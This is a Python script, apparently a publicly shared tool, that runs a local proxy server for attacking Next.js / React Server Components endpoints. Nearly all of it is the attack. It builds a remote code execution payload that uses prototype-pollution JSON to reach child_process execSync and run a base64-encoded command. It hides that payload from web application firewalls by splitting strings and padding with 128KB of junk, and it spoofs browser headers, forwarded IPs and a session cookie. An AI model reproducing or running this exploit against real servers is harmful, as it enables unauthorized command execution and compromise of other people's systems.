#!/usr/bin/env python3
"""
github.com/emredavut
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import sys
import secrets
import requests
import base64
import random
import string
from urllib.parse import urlparse, parse_qs
import urllib3

# SSL uyarılarını kapat
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PORT = 8765


class ProxyHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, X-Target-URL, X-requrl')
        self.end_headers()

    def do_POST(self):
        
        try:
            
            target_url = self.headers.get('X-Target-URL')
            command = self.headers.get('X-requrl', '')
            action = self.headers.get('X-Action', 'fingerprint')
            
            if not target_url:
                self.send_error(400, "Missing X-Target-URL header")
                return
            
            
            content_length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_length) if content_length > 0 else b''
            
            # Generate random boundary and request ID for each request
            boundary = f"----WebKitFormBoundary{secrets.token_hex(8)}"
            request_id = secrets.token_hex(4)
            
            # Build payload with random boundary
            if action == 'exploit':
                payload_body = self.build_rce_payload(command, boundary)
            else:
                payload_body = self.build_safe_payload(boundary)
            
            # Parse target URL for proper Origin header
            from urllib.parse import urlparse
            parsed_target = urlparse(target_url)
            origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
            
            # CloudFront bypass headers - make request look like legitimate browser traffic
            headers = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
                'Accept': 'text/x-component',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Next-Action': 'x',
                'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
                'Content-Type': f'multipart/form-data; boundary={boundary}',
                'Origin': origin,
                'Referer': target_url,
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Ch-Ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                'Sec-Ch-Ua-Mobile': '?0',
                'Sec-Ch-Ua-Platform': '"macOS"',
                'X-Nextjs-Request-Id': request_id,
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-Ip': '127.0.0.1',
            }
            
            # Add session cookies if available to look more legitimate
            cookies = {
                'next-auth.session-token': secrets.token_hex(16)
            }
            
            response = requests.post(
                target_url,
                headers=headers,
                cookies=cookies,
                data=payload_body,
                timeout=30,
                verify=False,
                allow_redirects=False
            )
            
           
            result = {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text[:2000],
                'command': command
            }
            
           
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
            
        except Exception as e:

            self.send_response(500)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'error': str(e)}).encode())

    def build_safe_payload(self, boundary):
        payload = f'--{boundary}\\r\\nContent-Disposition: form-data; name="1"\\r\\n\\r\\n{{}}\\r\\n--{boundary}\\r\\nContent-Disposition: form-data; name="0"\\r\\n\\r\\n["$1:aa:aa"]\\r\\n--{boundary}--'
        return payload.encode('utf-8')

    def generate_junk_data(self, size_bytes):
        """Generate random junk data for WAF bypass."""
        param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
        junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size_bytes))
        return param_name, junk

    def build_rce_payload(self, command, boundary):

        # Base64 encode the command to bypass WAF filters on command strings
        b64_cmd = base64.b64encode(command.encode()).decode()
        
        # Heavily obfuscated payload to bypass WAF
        # Uses Base64 for command and split strings for keywords
        prefix_payload = (
            f"var p=process;var r=p['main'+'Module']['re'+'quire'];"
            f"var c=r('ch'+'ild_pro'+'cess');var e=c['ex'+'ecSy'+'nc'];"
            f"var cmd=Buffer['fr'+'om']('{b64_cmd}','ba'+'se64')['toS'+'tring']();"
            f"var res=e(cmd)['toS'+'tring']()['tr'+'im']();"
            f";throw Object.assign(new Error('NEXT_REDIRECT'),"
            f"{{digest: `NEXT_REDIRECT;push;/login?a=${{res}};307;`}});"
        )
          
        part0 = (
            '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
            '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
            + prefix_payload
            + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
        )
        
        # Generate junk data (128KB) for WAF bypass
        param_name, junk = self.generate_junk_data(128 * 1024)
        junk_part = f'--{boundary}\r\nContent-Disposition: form-data; name="{param_name}"\r\n\r\n{junk}\r\n'
        
        payload = (
            junk_part +
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f"{part0}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="1"\r\n\r\n'
            f'"$@0"\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="2"\r\n\r\n'
            f"[]\r\n"
            f"--{boundary}--"
        )
        
        return payload.encode('utf-8')

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def main():
    print("""
          
╔═══════════════════════════════════════════════════════════╗
║              RSC Security Tool - Proxy Server             ║
║                     EMRE DAVUT                            ║
╚═══════════════════════════════════════════════════════════╝

""")
    
    try:
        server = HTTPServer(('0.0.0.0', PORT), ProxyHandler)
        print(f"✓ Server running on http://localhost:{PORT}")
        print(f"Port: {PORT}")
        print(f"✓ Ready to accept connections\n")
        print("✓ Press Ctrl+C to stop the server")
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\n✓ Server stopped")
    except Exception as e:
        print(f"✗ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()